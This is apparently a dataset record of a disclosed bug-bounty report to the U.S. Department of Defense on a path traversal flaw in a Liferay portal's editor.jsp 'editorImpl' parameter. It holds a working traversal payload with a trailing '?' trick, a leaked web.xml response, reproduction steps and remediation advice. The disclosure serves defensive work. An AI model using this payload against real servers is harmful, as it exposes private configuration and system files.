{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "twicedi ",
    "title": "Path traversal on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
    "content": "\nSummary:\nThe web application hosted on the \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" domain is affected by a path traversal vulnerability that could permit to an attacker to include arbirtary files that are outside of the restricted directory.\nDescription:\nThe affected handler is the \"/html/js/editor/editor.jsp\".\nThis handler receives, through the \"editorImpl\" parameter, an input from the user to construct a pathname that is intended to identify a file, but the web app does not properly neutralize \"dot-dot-slash (../)\" within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory as showed in the following example in which the web.xml configuration file is included:\nExample of payload:\n../../../WEB-INF/web.xml?\nURL:\n(Note: the last question mark char (\"?\") is necessary to exploit the vulnerability otherwise an error is triggered, with a full stacktrace)\nCode 75 Bytes\n1https://\u2588\u2588\u2588\u2588/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?\nCode 11.95 KiB\n1HTTP/1.1 200 OK\n2Content-Type: text/html\n3Server: Microsoft-IIS/8.5\n4X-Powered-By: ASP.NET\n5Date: Thu, 30 Mar 2017 20:24:43 GMT\n6Connection: close\n7Content-Length: 54193\n8\n9\n10<?xml version=\"1.0\"?>\n11\n12<web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" version=\"2.4\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\">\n13\t<context-param>\n14\t\t<param-name>contextClass</param-name>\n15\t\t<param-value>com.liferay.portal.spring.context.PortalApplicationContext</param-value>\n16\t</context-param>\n17\t<context-param>\n18\t\t<param-name>contextConfigLocation</param-name>\n19\t\t<param-value/>\n20\t</context-param>\n21\t<context-param>\n22\t\t<param-name>com.ibm.websphere.portletcontainer.PortletDeploymentEnabled</param-name>\n23\t\t<param-value>false</param-value>\n24\t</context-param>\n25\t<filter>\n26\t\t<filter-name>Absolute Redirects Filter</filter-name>\n27\t\t<filter-class>com.liferay.portal.servlet.filters.absoluteredirects.AbsoluteRedirectsFilter</filter-class>\n28\t</filter>\n29\t<filter>\n30\t\t<filter-name>Audit Filter</filter-name>\n31\t\t<filter-class>com.liferay.portal.servlet.filters.audit.AuditFilter</filter-class>\n32\t</filter>\n33\t<filter>\n34\t\t<filter-name>Auto Login Filter</filter-name>\n35\t\t<filter-class>com.liferay.portal.servlet.filters.autologin.AutoLoginFilter</filter-class>\n36\t</filter>\n37\t<filter>\n38\n39[REDACTED...]\n40\n41\t<filter>\n42\t\t<filter-name>GZip Filter</filter-name>\n43\t\t<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>\n44\t</filter>\n45\t<filter>\n46\t\t<filter-name>GZip Filter - Theme PNG</filter-name>\n47\t\t<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>\n48\t\t<init-param>\n49\t\t\t<param-name>url-regex-pattern</param-name>\n50\t\t\t<param-value>.+/themes/.*/images/.*\\.png</param-value>\n51\t\t</init-param>\n52\t</filter>\n53\t<filter>\n54\t\t<filter-name>Header Filter</filter-name>\n55\t\t<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>\n56\t\t<init-param>\n57\t\t\t<param-name>url-regex-ignore-pattern</param-name>\n58\t\t\t<param-value>.+/-/.+</param-value>\n59\t\t</init-param>\n60\t\t<init-param>\n61\t\t\t<param-name>Cache-Control</param-name>\n62\t\t\t<param-value>max-age=315360000, public</param-value>\n63\t\t</init-param>\n64\t\t<init-param>\n65\t\t\t<param-name>Expires</param-name>\n66\t\t\t<param-value>315360000</param-value>\n67\t\t</init-param>\n68\t\t<init-param>\n69\t\t\t<param-name>Vary</param-name>\n70\t\t\t<param-value>Accept-Encoding</param-value>\n71\t\t</init-param>\n72\t</filter>\n73\t<filter>\n74\t\t<filter-name>Header Filter - JSP</filter-name>\n75\t\t<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>\n76\t\t<init-param>\n77\t\t\t<param-name>url-regex-pattern</param-name>\n78\t\t\t<param-value>.+/(barebone|css|everything|main)\\.jsp</param-value>\n79\t\t</init-param>\n80\t\t<init-param>\n81\t\t\t<param-name>Cache-Control</param-name>\n82\t\t\t<param-value>max-age=315360000, public</param-value>\n83\t\t</init-param>\n84\t\t<init-param>\n85\t\t\t<param-name>Expires</param-name>\n86\t\t\t<param-value>315360000</param-value>\n87\t\t</init-param>\n88\t\t<init-param>\n89\t\t\t<param-name>Vary</param-name>\n90\t\t\t<param-value>Accept-Encoding</param-value>\n91\t\t</init-param>\n92\t</filter>\n93\t\n94[REDACTED...]\n95\n96\t<filter>\n97\t\t<filter-name>Minifier Filter</filter-name>\n98\t\t<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>\n99\t</filter>\n100\t<filter>\n101\t\t<filter-name>Minifier Filter - JSP</filter-name>\n102\t\t<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>\n103\t\t<init-param>\n104\t\t\t<param-name>url-regex-pattern</param-name>\n105\t\t\t<param-value>.+/(barebone|css|everything|main)\\.jsp</param-value>\n106\t\t</init-param>\n107\t</filter>\n108\t<filter>\n109\t\t<filter-name>Monitoring Filter</filter-name>\n110\t\t<filter-class>com.liferay.portal.servlet.filters.monitoring.MonitoringFilter</filter-class>\n111\t</filter>\n112\t<filter>\n113\t\t<filter-name>Secure Main Servlet Filter</filter-name>\n114\t\t<filter-class>com.liferay.portal.servlet.filters.secure.SecureFilter</filter-class>\n115\t\t<init-param>\n116\t\t\t<param-name>portal_property_prefix</param-name>\n117\t\t\t<param-value>main.servlet.</param-value>\n118\t\t</init-param>\n119\t</filter>\n120\t<filter>\n121\t\t<filter-name>Session Id Filter</filter-name>\n122\t\t<filter-class>com.liferay.portal.servlet.filters.sessionid.SessionIdFilter</filter-class>\n123\t</filter>\n124\t<filter>\n125\t\t<filter-name>SSO CAS Filter</filter-name>\n126\t\t<filter-class>com.liferay.portal.servlet.filters.sso.cas.CASFilter</filter-class>\n127\t</filter>\n128\t\n129[REDACTED...]\n130\n131\t<filter-mapping>\n132\t\t<filter-name>Sharepoint Filter</filter-name>\n133\t\t<url-pattern>/sharepoint/_vti_bin/_vti_aut/author.dll</url-pattern>\n134\t</filter-mapping>\n135\t<filter-mapping>\n136\t\t<filter-name>Sharepoint Filter</filter-name>\n137\t\t<url-pattern>/sharepoint/_vti_bin/owssvr.dll</url-pattern>\n138\t</filter-mapping>\n139\t<filter-mapping>\n140\t\t<filter-name>SSO CAS Filter</filter-name>\n141\t\t<url-pattern>/c/portal/login</url-pattern>\n142\t\t<dispatcher>REQUEST</dispatcher>\n143\t\t<dispatcher>FORWARD</dispatcher>\n144\t</filter-mapping>\n145\t<filter-mapping>\n146\t\t<filter-name>SSO CAS Filter</filter-name>\n147\t\t<url-pattern>/c/portal/logout</url-pattern>\n148\t\t<dispatcher>REQUEST</dispatcher>\n149\t\t<dispatcher>FORWARD</dispatcher>\n150\t</filter-mapping>\n151\t<filter-mapping>\n152\t\t<filter-name>SSO Ntlm Filter</filter-name>\n153\t\t<url-pattern>/c/portal/login</url-pattern>\n154\t\t<dispatcher>REQUEST</dispatcher>\n155\t\t<dispatcher>FORWARD</dispatcher>\n156\t</filter-mapping>\n157\t<filter-mapping>\n158\t\t<filter-name>SSO Ntlm Post Filter</filter-name>\n159\t\t<url-pattern>/*</url-pattern>\n160\t</filter-mapping>\n161\t\n162[REDACTED...]\n163\t\n164\t<filter-mapping>\n165\t\t<filter-name>Monitoring Filter</filter-name>\n166\t\t<url-pattern>/user/*</url-pattern>\n167\t\t<dispatcher>REQUEST</dispatcher>\n168\t\t<dispatcher>FORWARD</dispatcher>\n169\t</filter-mapping>\n170\t<filter-mapping>\n171\t\t<filter-name>Monitoring Filter</filter-name>\n172\t\t<url-pattern>/web/*</url-pattern>\n173\t\t<dispatcher>REQUEST</dispatcher>\n174\t\t<dispatcher>FORWARD</dispatcher>\n175\t</filter-mapping>\n176\t<listener>\n177\t\t<listener-class>com.liferay.portal.spring.context.PortalContextLoaderListener</listener-class>\n178\t</listener>\n179\t<listener>\n180\t\t<listener-class>com.liferay.portal.servlet.PortalSessionListener</listener-class>\n181\t</listener>\n182\t<listener>\n183\t\t<listener-class>com.liferay.portal.kernel.servlet.PortletSessionListenerManager</listener-class>\n184\t</listener>\n185\t<listener>\n186\t\t<listener-class>com.liferay.portal.kernel.servlet.SerializableSessionAttributeListener</listener-class>\n187\t</listener>\n188\t<listener>\n189\t\t<listener-class>com.liferay.portal.servlet.SharedSessionAttributeListener</listener-class>\n190\t</listener>\n191\t<servlet>\n192\t\t<servlet-name>Web Server Servlet</servlet-name>\n193\t\t<servlet-class>mil.army.lwn.liferay.portal.webserver.WebServerServlet</servlet-class>\n194\t\t<load-on-startup>2</load-on-startup>\n195\t</servlet>\n196\t<servlet>\n197\t\t<servlet-name>Main Servlet</servlet-name>\n198\t\t<servlet-class>com.liferay.portal.servlet.MainServlet</servlet-class>\n199\t\t<init-param>\n200\t\t\t<param-name>config</param-name>\n201\t\t\t<param-value>/WEB-INF/struts-config.xml,/WEB-INF/struts-config-ext.xml</param-value>\n202\t\t</init-param>\n203\t\t<init-param>\n204\t\t\t<param-name>debug</param-name>\n205\t\t\t<param-value>0</param-value>\n206\t\t</init-param>\n207\t\t<init-param>\n208\t\t\t<param-name>detail</param-name>\n209\t\t\t<param-value>0</param-value>\n210\t\t</init-param>\n211\t\t<load-on-startup>1</load-on-startup>\n212\t</servlet>\n213\t<servlet>\n214\t\t<servlet-name>Combo Servlet</servlet-name>\n215\t\t<servlet-class>com.liferay.portal.servlet.ComboServlet</servlet-class>\n216\t\t<load-on-startup>2</load-on-startup>\n217\t</servlet>\n218\t<servlet>\n219\t\t<servlet-name>Display Chart</servlet-name>\n220\t\t<servlet-class>com.liferay.portal.servlet.DisplayChartServlet</servlet-class>\n221\t\t<load-on-startup>2</load-on-startup>\n222\t</servlet>\n223\t<servlet>\n224\t\t<servlet-name>Facebook Servlet</servlet-name>\n225\t\t<servlet-class>com.liferay.portal.facebook.FacebookServlet</servlet-class>\n226\t\t<load-on-startup>2</load-on-startup>\n227\t</servlet>\n228\t<servlet>\n229\t\t<servlet-name>Friendly URL Servlet - Private Group</servlet-name>\n230\t\t<servlet-class>com.liferay.portal.servlet.FriendlyURLServlet</servlet-class>\n231\t\t<init-param>\n232\t\t\t<param-name>private</param-name>\n233\t\t\t<param-value>true</param-value>\n234\t\t</init-param>\n235\t\t<init-param>\n236\t\t\t<param-name>user</param-name>\n237\t\t\t<param-value>false</param-value>\n238\t\t</init-param>\n239\t\t<load-on-startup>2</load-on-startup>\n240\t</servlet>\n241\t<servlet>\n242\t\t<servlet-name>Friendly URL Servlet - Private User</servlet-name>\n243\t\t<servlet-class>com.liferay.portal.servlet.FriendlyURLServlet</servlet-class>\n244\t\t<init-param>\n245\t\t\t<param-name>private</param-name>\n246\t\t\t<param-value>true</param-value>\n247\t\t</init-param>\n248\t\t<init-param>\n249\t\t\t<param-name>user</param-name>\n250\t\t\t<param-value>true</param-value>\n251\t\t</init-param>\n252\t\t<load-on-startup>2</load-on-startup>\n253\t</servlet>\n254\t\n255[REDACTED...]\n256\n257\t<servlet>\n258\t\t<servlet-name>XML-RPC Servlet</servlet-name>\n259\t\t<servlet-class>com.liferay.portal.xmlrpc.XmlRpcServlet</servlet-class>\n260\t\t<load-on-startup>2</load-on-startup>\n261\t</servlet>\n262\t<servlet>\n263\t\t<servlet-name>Clean Up Servlet</servlet-name>\n264\t\t<servlet-class>com.liferay.portal.servlet.CleanUpServlet</servlet-class>\n265\t\t<load-on-startup>3</load-on-startup>\n266\t</servlet>\n267\t<servlet-mapping>\n268\t\t<servlet-name>Main Servlet</servlet-name>\n269\t\t<url-pattern>/c/*</url-pattern>\n270\t</servlet-mapping>\n271\t<servlet-mapping>\n272\t\t<servlet-name>Combo Servlet</servlet-name>\n273\t\t<url-pattern>/combo/*</url-pattern>\n274\t</servlet-mapping>\n275\t<servlet-mapping>\n276\t\t<servlet-name>Display Chart</servlet-name>\n277\t\t<url-pattern>/display_chart/*</url-pattern>\n278\t</servlet-mapping>\n279\t<servlet-mapping>\n280\t\t<servlet-name>Facebook Servlet</servlet-name>\n281\t\t<url-pattern>/facebook/*</url-pattern>\n282\t</servlet-mapping>\n283\t<servlet-mapping>\n284\t\t<servlet-name>Friendly URL Servlet - Private Group</servlet-name>\n285\t\t<url-pattern>/group/*</url-pattern>\n286\t</servlet-mapping>\n287\t<servlet-mapping>\n288\t\t<servlet-name>Friendly URL Servlet - Private User</servlet-name>\n289\t\t<url-pattern>/user/*</url-pattern>\n290\t</servlet-mapping>\n291\t<servlet-mapping>\n292\t\t<servlet-name>Friendly URL Servlet - Public</servlet-name>\n293\t\t<url-pattern>/web/*</url-pattern>\n294\t</servlet-mapping>\n295\t<servlet-mapping>\n296\t\t<servlet-name>Google Gadget Servlet</servlet-name>\n297\t\t<url-pattern>/google_gadget/*</url-pattern>\n298\t</servlet-mapping>\n299\n300[REDACTED...]\n301\n302\t<servlet-mapping>\n303\t\t<servlet-name>Widget Servlet</servlet-name>\n304\t\t<url-pattern>/widget/*</url-pattern>\n305\t</servlet-mapping>\n306\t<servlet-mapping>\n307\t\t<servlet-name>XML-RPC Servlet</servlet-name>\n308\t\t<url-pattern>/xmlrpc/*</url-pattern>\n309\t</servlet-mapping>\n310\t<session-config>\n311\t\t<session-timeout>120</session-timeout>\n312\t</session-config>\n313\t<welcome-file-list>\n314\t\t<welcome-file>index.html</welcome-file>\n315\t\t<welcome-file>index.jsp</welcome-file>\n316\t</welcome-file-list>\n317\t<error-page>\n318\t\t<error-code>404</error-code>\n319\t\t<location>/errors/404.jsp</location>\n320\t</error-page>\n321\t<jsp-config>\n322\t\t<taglib>\n323\t\t\t<taglib-uri>http://displaytag.sf.net</taglib-uri>\n324\t\t\t<taglib-location>/WEB-INF/tld/displaytag.tld</taglib-location>\n325\t\t</taglib>\n326\t\t<taglib>\n327\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/core</taglib-uri>\n328\t\t\t<taglib-location>/WEB-INF/tld/c.tld</taglib-location>\n329\t\t</taglib>\n330\t\t<taglib>\n331\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/fmt</taglib-uri>\n332\t\t\t<taglib-location>/WEB-INF/tld/fmt.tld</taglib-location>\n333\t\t</taglib>\n334\t\t<taglib>\n335\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/functions</taglib-uri>\n336\t\t\t<taglib-location>/WEB-INF/tld/fn.tld</taglib-location>\n337\t\t</taglib>\n338\n339[REDACTED...]\n340\n341\t\t<taglib>\n342\t\t\t<taglib-uri>http://struts.apache.org/tags-tiles</taglib-uri>\n343\t\t\t<taglib-location>/WEB-INF/tld/struts-tiles.tld</taglib-location>\n344\t\t</taglib>\n345\t\t<taglib>\n346\t\t\t<taglib-uri>http://struts.apache.org/tags-tiles-el</taglib-uri>\n347\t\t\t<taglib-location>/WEB-INF/tld/struts-tiles-el.tld</taglib-location>\n348\t\t</taglib>\n349\t</jsp-config>\n350\t<security-constraint>\n351\t\t<web-resource-collection>\n352\t\t\t<web-resource-name>/c/portal/protected</web-resource-name>\n353\t\t\t<url-pattern>/c/portal/protected</url-pattern>\n354\t\t\t<url-pattern>/ar/c/portal/protected</url-pattern>\n355\t\n356[REDACTED...]\n357\n358\n359\t\t\t<http-method>GET</http-method>\n360\t\t\t<http-method>POST</http-method>\n361\t\t</web-resource-collection>\n362\t\t<auth-constraint>\n363\t\t\t<role-name>users</role-name>\n364\t\t</auth-constraint>\n365\t\t<user-data-constraint>\n366\t\t\t<transport-guarantee>NONE</transport-guarantee>\n367\t\t</user-data-constraint>\n368\t</security-constraint>\n369\t<login-config>\n370\t\t<auth-method>FORM</auth-method>\n371\t\t<realm-name>PortalRealm</realm-name>\n372\t\t<form-login-config>\n373\t\t\t<form-login-page>/c/portal/j_login</form-login-page>\n374\t\t\t<form-error-page>/c/portal/j_login_error</form-error-page>\n375\t\t</form-login-config>\n376\t</login-config>\n377\t<security-role>\n378\t\t<role-name>users</role-name>\n379\t</security-role>\n380</web-app>\nImpact\nIt may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.\nStep-by-step Reproduction Instructions\nIt\u2019s possible to insert a malicious string as the \"editorImpl\" parameter of the following handler to access files that are outside of the restricted directory: (Note: the last question mark char (\"?\") is necessary to exploit the vulnerability otherwise an error is triggered, with a full stacktrace)\nCode 81 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?\nSuggested Mitigation/Remediation Actions\nIt is advisable to:\nPrefer working without user input when using file system calls\nUse indexes rather than actual portions of file names when templating or using language files\nEnsure the user cannot supply all parts of the path \u2013 surround it with your path code\nValidate the user\u2019s input by only accepting known good \u2013 do not sanitize the data\nUse chrooted jails and code access policies to restrict where the files can be obtained or saved to\nIf forced to use user input for file operations, normalize the input before using in file io API's\nI'm available for further clarification,\nBest,\nDavide\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Path Traversal"
    ],
    "screenshots": {},
    "disclosed_date": 1570216980,
    "report_url": "https://hackerone.com/reports/217344",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the vulnerable endpoint: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/html/js/editor/editor.jsp"
        ],
        [
            2,
            "Append the path traversal payload to the 'editorImpl' parameter: ?editorImpl=../../../WEB-INF/web.xml?"
        ]
    ],
    "vuln_description": "The web application is vulnerable to path traversal via the 'editorImpl' parameter in the editor.jsp endpoint, allowing unauthorized access to files outside the restricted directory (e.g., WEB-INF/web.xml).",
    "reason": "The vulnerability involves a straightforward path traversal technique with no complex interactions or state manipulation. The only non-obvious aspect is the requirement to include a trailing '?' character to bypass an error condition.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}